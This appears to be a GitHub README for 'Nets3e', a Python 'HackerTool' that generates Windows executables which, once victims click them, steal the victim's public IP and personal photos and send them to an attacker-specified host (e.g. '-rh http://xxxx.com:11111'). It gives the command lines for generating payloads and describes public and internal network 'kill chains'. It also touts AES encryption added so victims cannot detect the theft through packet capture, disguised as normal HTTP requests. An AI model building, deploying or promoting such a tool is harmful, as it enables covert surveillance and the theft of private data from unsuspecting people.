  <div align="center">
<p align="center">
 <img title="Nets3e" src='https://img.shields.io/badge/Nets3e-1.1.2-brightgreen.svg' />
 <img title="Nets3e" src='https://img.shields.io/badge/Python-3.9-yellow.svg' />
  <img title="Nets3e" src='https://img.shields.io/badge/HackerTool-x' />
 <img title="Nets3e" src='https://img.shields.io/static/v1?label=Author&message=@Martin&color=red'/>
 <img title="Nets3e" src='https://img.shields.io/badge/-windows-F16061?logo=windows&logoColor=000'/>
 </p>
  <img height="137px" src="https://github-readme-stats.vercel.app/api?username=MartinXMax&hide_title=true&hide_border=true&show_icons=trueline_height=21&text_color=000&icon_color=000&bg_color=0,ea6161,ffc64d,fffc4d,52fa5a&theme=graywhite" />
  
   
 <table>
  <tr>
      <th>Function</th>
  </tr>
  <tr>
    <th>Obtain the victim's public network IP and personal photos</th>
    <th>Internal shortest path attack</th>
    <th>Add AES encryption to prevent intermediaries from hijacking information [NEW]</th>
</tr>
 
 </table>
</div>


  
## Nets3e Example

``#python3 Nets3e.py -h``

![图片名称](./PT/helpv1.1.2.png) 



```ps:Use '- g' to generate PAYLOAD, but you don't need to specify '- g'```

``#python3 Nets3e.py -rh http://xxxx.com:11111 -g``


![图片名称](./PT/1.png) 

``Follow the prompts in/ Generate two exe executable files from the dist directory``

![图片名称](./PT/2.png) 

_Nets3eClient_debug.exe -> The debug version of internal network attacks is mainly used to test whether internal network victims can reach the local machine_

_Nets3eClient_release.exe -> The release version of public network attacks is mainly used to attack public network users_

## Public network attack

``Victims click on Nets3eClient_release.exe``




![图片名称](./PT/out.png) 

``Attack Kill Chain``

![图片名称](./PT/Chain_Re.png) 

## Internal network attack

``Victims click on Nets3eClient_debug.exe``

``PS:Affected hosts on the internal network will first obtain their own public IP address and then send photos to the internal network host. In fact, the traffic is not forwarded by the server``



![图片名称](./PT/in.png) 

``Attack Kill Chain``

![图片名称](./PT/Chain_Debug.png) 

## Add Salt

``[New] Add the (-salt) parameter, which allows the client to perform AES encryption on your data transmission to prevent it from falling into the hands of intermediaries
Default salt value: LAN local host IP
``

_Nets3e v1.1.1_

``
Directly using BASE64 encoding is very insecure, resulting in victims being able to determine the attacker's behavior by capturing packets
``

![图片名称](./PT/v1.1.1.png) 

![图片名称](./PT/b64.png) 

_Nets3e v1.1.2_

_Using AES encryption significantly increases the difficulty of cracking plaintext, and the victim cannot detect anomalies through packet capture, disguised as normal HTTP requests_

![图片名称](./PT/v1.1.2.png) 

![图片名称](./PT/salt.png) 

